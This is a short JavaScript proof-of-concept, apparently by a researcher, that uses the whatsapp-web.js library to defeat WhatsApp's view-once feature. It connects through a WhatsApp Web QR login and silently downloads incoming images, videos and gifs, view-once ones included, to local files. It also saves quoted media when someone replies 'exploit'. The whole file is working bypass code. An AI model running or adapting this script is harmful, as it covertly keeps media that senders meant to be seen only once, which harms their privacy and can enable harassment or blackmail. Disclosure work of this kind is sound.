/*

	Script to reproduce a WhatsApp view-once bypass
	Author: Lucas Rodrigues Pimentel
	Github: @lucasrdrgs
	E-mail: lucasrodriguespimentel@gmail.com
	Date: 24 September 2021

*/

import { Client } from 'whatsapp-web.js';
const client = new Client();

import fs from 'fs';
import { v4 as uuidv4 } from 'uuid';
import qrcode from 'qrcode-terminal';
import atob from 'atob';
import Blob from 'cross-blob';

// show whatsapp web qr code
client.on('qr', (qr) => {
	qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
	console.log('I am now receiving messages.');
});

async function saveFile(blob, filename) {
	const buffer = Buffer.from(await blob.arrayBuffer());
	fs.writeFile(filename, buffer, () => console.log('Media has been downloaded as ' + filename));
}

client.on('message', async (msg_) => {
	let msg = msg_;
	if (!(msg.type === 'image' || msg.type === 'video' || msg.type === 'gif') && msg.body == 'exploit') {
		try {
			msg = await msg.getQuotedMessage();
			if(!(msg.type === 'image' || msg.type === 'video' || msg.type === 'gif')) return;
		}
		catch(exc) { }
	}
	try {
		// returns MessageMedia, whose properties are:
		// - data: base64 encoded media
		// - mimetype
		// - filename (can be null, this is for document attachments)
		// see https://docs.wwebjs.dev/Message.html#downloadMedia
		const media = await msg.downloadMedia();
		if (media === undefined) {
			console.log('No media found.');
			return;
		}

		// turn base64 into raw bytes (deprecated but it works):
		const asString = atob(media.data);
		let bytes = [];
		for(let i = 0; i < asString.length; i++) {
			bytes[i] = asString.charCodeAt(i);
		}
		const byteArray = new Uint8Array(bytes);
		const blob = new Blob([byteArray], {type: media.mimetype});
		const extension = media.mimetype.split('/')[1];
		const filename = uuidv4();
		saveFile(blob, filename + '.' + extension);
	}
	catch(exc) {
		console.log('Something went wrong: ' + exc);
	}
});

client.initialize();
